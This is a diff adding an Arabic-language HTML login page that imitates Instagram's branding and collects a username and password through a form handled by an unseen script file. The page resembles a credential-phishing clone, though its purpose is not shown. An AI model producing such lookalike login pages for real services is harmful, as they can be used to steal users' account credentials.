@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>تسجيل الدخول - Instagram</title>
+    <link rel="stylesheet" href="style.css" />
+    <!-- <link
+      href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap"
+      rel="stylesheet"
+    /> -->
+
+    <link
+      href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo-container">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+          alt="Instagram Logo"
+          class="logo-image"
+        />
+        <div class="logo">Instagram</div>
+      </div>
+      <button class="btn-facebook">متابعة بحساب فيسبوك</button>
+      <div class="separator"><span>أو</span></div>
+
+      <!-- إضافة نموذج وإرفاق event listener -->
+      <form id="loginForm">
+        <input
+          type="text"
+          id="username"
+          class="input-field"
+          placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني"
+          required
+        />
+        <input
+          type="password"
+          id="password"
+          class="input-field"
+          placeholder="كلمة السر"
+          required
+        />
+        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+        <button type="submit" class="btn-login">تسجيل الدخول</button>
+      </form>
+
+      <div class="register">ألا تملك حساباً؟ <a href="#">تسجيل</a></div>
+      <p id="message"></p>
+    </div>
+
+    <script src="scritp.js"></script>
+  </body>
+</html>
